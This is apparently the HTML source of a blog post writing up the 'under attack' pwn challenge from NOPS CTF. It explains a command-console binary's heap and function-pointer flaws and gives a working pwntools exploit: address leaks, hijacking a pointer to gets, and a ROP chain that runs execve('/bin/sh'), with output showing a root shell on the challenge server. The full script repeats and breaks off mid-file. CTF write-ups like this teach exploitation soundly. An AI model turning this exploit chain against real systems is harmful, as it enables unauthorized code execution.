@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>under attack writeup - pegielm</title><link rel="icon" type="image/png" href=https://img.icons8.com/?size&#61;100&amp;id&#61;16133&amp;format&#61;png&amp;color&#61;000000 /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="[pwn] writeup of the under attack challenge from nops ctf" />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="http://localhost:1313/posts/under_attack_writeup/">
+  <meta property="og:site_name" content="pegielm">
+  <meta property="og:title" content="under attack writeup">
+  <meta property="og:description" content="[pwn] writeup of the under attack challenge from nops ctf">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-02T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-06-02T00:00:00+00:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Pwn">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="under attack writeup">
+  <meta name="twitter:description" content="[pwn] writeup of the under attack challenge from nops ctf">
+<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@1,500&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.d902908ac6e0fab67957de5db5aea1b6455b19ae2ca98eac4c95a4a0fdc02238.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.c95c5dcf5f32f8b67bd36f7dab66680e068fce2b303087294114aabf7a7c080b.css"  disabled />
+	
+
+	
+	
+
+	
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">pegielm</a>
+	</div>
+	<nav>
+		
+		<a href="/">home</a>
+		
+		<a href="/posts">all posts</a>
+		
+		<a href="/about">about me</a>
+		
+		<a href="/tags">tags</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="http://localhost:1313/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">under attack writeup</h1>
+			<div class="meta">Posted on Jun 2, 2025</div>
+		</div>
+		
+
+		<section class="body">
+			<h1 id="challenge-description">Challenge description</h1>
+<p>Ladybug Command System FULLY OPERATIONAL</p>
+<p>(attached challenge binary with libc)</p>
+<h1 id="solution">Solution</h1>
+<p>program is command console:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span> ./ladybug_app  
+</span></span><span style="display:flex;"><span>Noopsy Defenses CRUSHED! Ladybug Command System FULLY OPERATIONAL!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- Ladybug Overlord Command Console ---
+</span></span><span style="display:flex;"><span>       Noopsy Land Operations Menu      
+</span></span><span style="display:flex;"><span>----------------------------------------
+</span></span><span style="display:flex;"><span>unleash_swarm &lt;idx&gt; &lt;size&gt;         - Deploy new agent.
+</span></span><span style="display:flex;"><span>corrupt_systems &lt;idx&gt; &lt;hex_data&gt;   - Inject payload into agent.
+</span></span><span style="display:flex;"><span>gather_intel &lt;idx&gt;                 - Retrieve intel from agent.
+</span></span><span style="display:flex;"><span>retreat_agent &lt;idx&gt;                - Recall agent.
+</span></span><span style="display:flex;"><span>seize_airwaves &lt;hex_addr&gt;          - Hijack comms relay.
+</span></span><span style="display:flex;"><span>send_echo_pulse                    - Send pulse via relay.
+</span></span><span style="display:flex;"><span>steal_noopsy_secrets               - Reveal system blueprint fragment.
+</span></span><span style="display:flex;"><span>initiate_city_takeover &lt;hex_addr&gt;  - Execute final takeover payload.
+</span></span><span style="display:flex;"><span>vanish_into_shadows                - Disengage Ladybug Command.
+</span></span><span style="display:flex;"><span>----------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Noopsy Land is ours! Your command, Overlord?:
+</span></span></code></pre></div><p>after inspecting decompiled binary these are what the functions do:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>unleash_swarm &lt;idx&gt; &lt;size&gt;         # malloc of size &lt;size&gt; and print its address
+</span></span><span style="display:flex;"><span>corrupt_systems &lt;idx&gt; &lt;hex_data&gt;   # write hex data to addres in heap of agent - can overflow 
+</span></span><span style="display:flex;"><span>gather_intel &lt;idx&gt;                 # read from agent address (even after free) 
+</span></span><span style="display:flex;"><span>retreat_agent &lt;idx&gt;                # free agent address
+</span></span><span style="display:flex;"><span>seize_airwaves &lt;hex_addr&gt;          # sets echo pulse (function pointer) to address
+</span></span><span style="display:flex;"><span>send_echo_pulse                    # executes pulse (or whatever is at address) 
+</span></span><span style="display:flex;"><span>steal_noopsy_secrets               # prints address of unleash_swarm
+</span></span><span style="display:flex;"><span>initiate_city_takeover &lt;hex_addr&gt;  # read from address 
+</span></span><span style="display:flex;"><span>vanish_into_shadows                # exit program
+</span></span></code></pre></div><p>there are a lot of vulerabilites in this program: use after free, arbitrary read, arbitrary write, we also just get leak of address from <code>steal_noopsy_secrets</code>.</p>
+<p>there are also not so many mitigations:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>    Arch:       amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:      No canary found
+</span></span><span style="display:flex;"><span>    NX:         NX enabled
+</span></span><span style="display:flex;"><span>    PIE:        No PIE (0x400000)
+</span></span></code></pre></div><p>first step is to write wrapper of each function to make code simpler:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unleash_swarm</span>(idx, size):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;unleash_swarm&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39; </span><span style="color:#e6db74">{</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    agent_address <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> int(agent_address, <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">corrupt_systems</span>(idx, hex_data):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;corrupt_systems&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39; </span><span style="color:#e6db74">{</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>hex_data<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;INJECT_OK&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> response:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Failed to inject payload: </span><span style="color:#e6db74">{</span>response<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gather_intel</span>(idx):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;gather_intel&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39; </span><span style="color:#e6db74">{</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;DATA: &#39;</span>)
+</span></span><span style="display:flex;"><span>    intel <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> intel<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">retreat_agent</span>(idx):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;retreat_agent&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39; </span><span style="color:#e6db74">{</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;RECALL_OK&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> response:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Failed to retreat agent: </span><span style="color:#e6db74">{</span>response<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">seize_airwaves</span>(hex_addr):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;seize_airwaves &#39;</span> <span style="color:#f92672">+</span> hex_addr)
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ANTENNA_OK&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> response:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Failed to seize airwaves: </span><span style="color:#e6db74">{</span>response<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">steal_noopsy_secrets</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;steal_noopsy_secrets&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;BLUEPRINT_FRAGMENT: &#39;</span>)
+</span></span><span style="display:flex;"><span>    fragment <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> int(fragment, <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">initiate_city_takeover</span>(hex_addr):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;initiate_city_takeover&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39; </span><span style="color:#e6db74">{</span>hex_addr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_echo_pulse</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_echo_pulse&#39;</span>)
+</span></span></code></pre></div><p>after that we can get all the leaks we need (even more than necessary):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> steal_noopsy_secrets()
+</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x6d0</span> <span style="color:#75715e"># calculating elf base addres from leak of function address</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ELF base address: </span><span style="color:#e6db74">{</span>hex(elf<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>agent0 <span style="color:#f92672">=</span> unleash_swarm(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x20</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Agent 0 address: </span><span style="color:#e6db74">{</span>hex(agent0)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> agent0 <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x16c0</span> <span style="color:#75715e"># calculating heap address from agent address - </span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Heap address: </span><span style="color:#e6db74">{</span>hex(heap_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> unleash_swarm(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x200000</span>)
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">2113520</span> <span style="color:#75715e"># large allocation is handled by mmap(), and it is in constatnt offset from libc base address</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Libc base address: </span><span style="color:#e6db74">{</span>hex(libc<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span></code></pre></div><p>now we can use libc addres to just execute one_gadet right ? unfortunately all one_gadgets didn&rsquo;t work and rop chaining isn&rsquo;t possible, because we can just &lsquo;jump&rsquo; to one adress and we cant control stack and further execution flow.</p>
+<p>but we can create our own buffer overflow by using <code>gets</code> function</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>seize_airwaves(hex(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;gets&#39;</span>])[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>send_echo_pulse()
+</span></span></code></pre></div><p>so when we call <code>send_echo_pulse</code> it will execute <code>gets</code> function with some register values, but after checking that overflow is possible we can now send our ropchain to the program:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(libc)
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>execve(binsh, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2168</span>  <span style="color:#f92672">+</span> rop<span style="color:#f92672">.</span>chain() ) <span style="color:#75715e">#calculated with cyclic()</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;vanish_into_shadows&#39;</span>) <span style="color:#75715e"># we overwrote return addres and when program ends with &#39;vanish_into_shadows&#39; it will return to our ropchain</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>exploit works and we get shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># ./expl.py REMOTE
+</span></span><span style="display:flex;"><span>[*] &#39;/nopsctf/under_attack/ladybug_app&#39;
+</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:      No canary found
+</span></span><span style="display:flex;"><span>    NX:         NX enabled
+</span></span><span style="display:flex;"><span>    PIE:        No PIE (0x400000)
+</span></span><span style="display:flex;"><span>[+] Opening connection to 0.cloud.chals.io on port 33481: Done
+</span></span><span style="display:flex;"><span>[*] &#39;/nopsctf/under_attack/libc.so.6&#39;
+</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:      Canary found
+</span></span><span style="display:flex;"><span>    NX:         NX enabled
+</span></span><span style="display:flex;"><span>    PIE:        PIE enabled
+</span></span><span style="display:flex;"><span>[*] ELF base address: 0x401000
+</span></span><span style="display:flex;"><span>[*] Agent 0 address: 0x65e2c0
+</span></span><span style="display:flex;"><span>[*] Heap address: 0x65cc00
+</span></span><span style="display:flex;"><span>[*] Libc base address: 0x7f27f4887000
+</span></span><span style="display:flex;"><span>[*] Loaded 197 cached gadgets for &#39;./libc.so.6&#39;
+</span></span><span style="display:flex;"><span>[*] Switching to interactive mode
+</span></span><span style="display:flex;"><span>Ladybug Command disengaging. Noopsy Land remains under our shadow.
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=0(root)
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>flag.txt
+</span></span><span style="display:flex;"><span>ladybug_app
+</span></span><span style="display:flex;"><span>libc.so.6
+</span></span><span style="display:flex;"><span>$ cat flag.txt
+</span></span><span style="display:flex;"><span>N0PS{its_N0pSt0pia&#39;s_Pleasure_that_L4dy_bug__is_w3aaker!!!__}
+</span></span></code></pre></div><p>whole exploit code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>PATH <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./ladybug_app&#39;</span>
+</span></span><span style="display:flex;"><span>ADDR <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0.cloud.chals.io&#39;</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">33481</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(PATH)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;info&#39;</span>
+</span></span><span style="display:flex;"><span>gs <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug(elf<span style="color:#f92672">.</span>path, gdbscript<span style="color:#f92672">=</span>gs)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(ADDR,PORT)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>GDBWIN:
+</span></span><span style="display:flex;"><span>        context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;wt.exe&#39;</span>,<span style="color:#e6db74">&#39;wsl.exe&#39;</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug(elf<span style="color:#f92672">.</span>path, gdbscript<span style="color:#f92672">=</span>gs)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process(elf<span style="color:#f92672">.</span>path)
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#libc = elf.libc</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">######################</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unleash_swarm</span>(idx, size):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;unleash_swarm&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39; </span><span style="color:#e6db74">{</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    agent_address <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> int(agent_address, <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">corrupt_systems</span>(idx, hex_data):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;corrupt_systems&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39; </span><span style="color:#e6db74">{</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>hex_data<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;INJECT_OK&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> response:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Failed to inject payload: </span><span style="color:#e6db74">{</span>response<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gather_intel</span>(idx):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;gather_intel&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39; </span><span style="color:#e6db74">{</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;DATA: &#39;</span>)
+</span></span><span style="display:flex;"><span>    intel <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> intel<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">retreat_agent</span>(idx):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;retreat_agent&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39; </span><span style="color:#e6db74">{</span>idx<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;RECALL_OK&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> response:
